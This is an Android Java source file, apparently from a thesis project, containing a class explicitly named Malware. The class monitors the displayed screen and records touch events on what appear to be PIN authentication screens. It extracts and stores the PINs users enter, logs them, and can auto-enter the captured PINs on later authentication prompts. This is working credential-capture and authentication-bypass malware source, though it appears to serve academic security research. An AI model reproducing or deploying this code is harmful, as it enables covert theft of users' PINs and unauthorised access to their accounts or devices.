package com.example.thesis;

import android.app.Activity;
import android.content.Context;
import android.database.Cursor;
import android.util.Log;
import android.widget.TextView;

import com.example.thesis.Events.Event;
import com.example.thesis.Events.EventReader;

import java.util.Arrays;
import java.util.LinkedList;
import java.util.Queue;

/**
 * This is the malware part of the app.
 */
public class Malware implements Runnable {
    final private EventReader eventReader;

    private DisplayedScreenService displayedScreenService;

    private boolean doStop = false;
    private boolean eventReaderRunning = false;

    private Queue<Integer> PIN1;
    private Queue<Integer> PIN2;

    private DisplayedScreen whichPINscreen = DisplayedScreen.OTHER;

    private boolean autoEnterPIN = false;

    private Context context;
    private Activity activity;
    private DatabaseService database;


    public Malware(Context context, Activity activity, DatabaseService database) {
        this.context = context;
        this.activity = activity;
        this.database = database;

        this.eventReader = new EventReader();

        this.PIN1 = pinStringToQueue(database.getPIN(1));
        this.PIN2 = pinStringToQueue(database.getPIN(2));
    }


    public synchronized void doStop() {
        this.doStop = true;
        this.eventReader.doStop();
        this.displayedScreenService.doStop();
        Log.i("Malware", "Stopped malware!");
    }


    private synchronized boolean keepRunning() {
        return !this.doStop;
    }


    @Override
    public void run() {
        Log.i("Malware", "Started malware!");

        displayedScreenService = new DisplayedScreenService();

        while (keepRunning()) {
            DisplayedScreen currentScreen = displayedScreenService.getCurrentScreen();

            if (!autoEnterPIN) {
                // Recording events to get PIN.
                if (DisplayedScreen.OTHER != currentScreen) {
                    if (!eventReaderRunning) {
                        startListeningEvents();
                    }
                    malwareCode(currentScreen);
                } else if (eventReaderRunning) {
                    stopListeningEvents();
                }
            } else if (!PIN1.isEmpty() && !PIN2.isEmpty()) {
                // Auto sending the PIN.
                if (currentScreen == DisplayedScreen.AUTH_PIN_1) {
                    displayedScreenService.sendPIN(PIN1);
                } else if (currentScreen == DisplayedScreen.AUTH_PIN_2) {
                    displayedScreenService.sendPIN(PIN2);
                }
            } else {
                // Somehow auto enter pin is enabled when not knowing the PIN's, make it impossible.
                Log.e("Malware", "Auto enter pin is active, but don't know PIN(s).");
            }

            try {
                Thread.sleep(1000);
            } catch (InterruptedException e) {
                Log.i("Malware", "Run loop interrupted!");
            }
        }
    }


    private void malwareCode(DisplayedScreen currentScreen) {
        if (currentScreen == DisplayedScreen.AUTH_PIN_1) {
            whichPINscreen = DisplayedScreen.AUTH_PIN_1;
        } else if (currentScreen == DisplayedScreen.AUTH_PIN_2) {
            whichPINscreen = DisplayedScreen.AUTH_PIN_2;
        } else if (currentScreen == DisplayedScreen.AUTH_SUCCESS) {
            if (whichPINscreen == DisplayedScreen.AUTH_PIN_1) {
                setPIN1();
            } else if (whichPINscreen == DisplayedScreen.AUTH_PIN_2) {
                setPIN2();
            }
        } else if (currentScreen == DisplayedScreen.AUTH_FAILED) {
            getPIN();
        }
    }


    private void startListeningEvents() {
        eventReader.doStart();
        Thread eventReaderThread = new Thread(eventReader, "EventReader Thread");
        eventReaderThread.start();
        eventReaderRunning = true;
    }


    private void stopListeningEvents() {
        eventReader.doStop();
        eventReaderRunning = false;
    }


    /**
     * Empties touchevents also.
     * @return
     */
    private Queue<Integer> getPIN() {
        Queue<Event> touchEvents = eventReader.getTouchEvents();
        return displayedScreenService.extractPIN(touchEvents);
    }


    private void setPIN1() {
        PIN1 = getPIN();
        setPIN(1, R.id.textPIN1);
    }


    private void setPIN2() {
        PIN2 = getPIN();
        setPIN(2, R.id.textPIN2);
    }


    private void setPIN(int id, int textView_id) {
        TextView textView = (TextView) activity.findViewById(textView_id);
        String PIN_string = pinToString(id == 1 ? PIN1 : PIN2);
        saveToDatabase(id, PIN_string);
        textView.setText("PIN" + id + ": " + PIN_string);
        Log.i("Malware", "Captured PIN " + id + " " + PIN_string);
    }


    private String pinToString(Queue<Integer> PIN) {
        Queue<Integer> PIN1_copy = new LinkedList<>(PIN);
        StringBuilder sb = new StringBuilder();
        while(!PIN1_copy.isEmpty()) {
            sb.append(PIN1_copy.poll());
        }
        return sb.toString();
    }


    private void saveToDatabase(int id, String value){
        database.insertData(id, value);
    }


    private Queue<Integer> pinStringToQueue(String PIN_string) {
        String[] PIN_array = PIN_string.split("");
        Queue<Integer> PIN_queue = new LinkedList<>();
        for (int i = 0; i < PIN_array.length; i++) {
            PIN_queue.add(Integer.parseInt(PIN_array[i]));
        }
        return PIN_queue;
    }



}



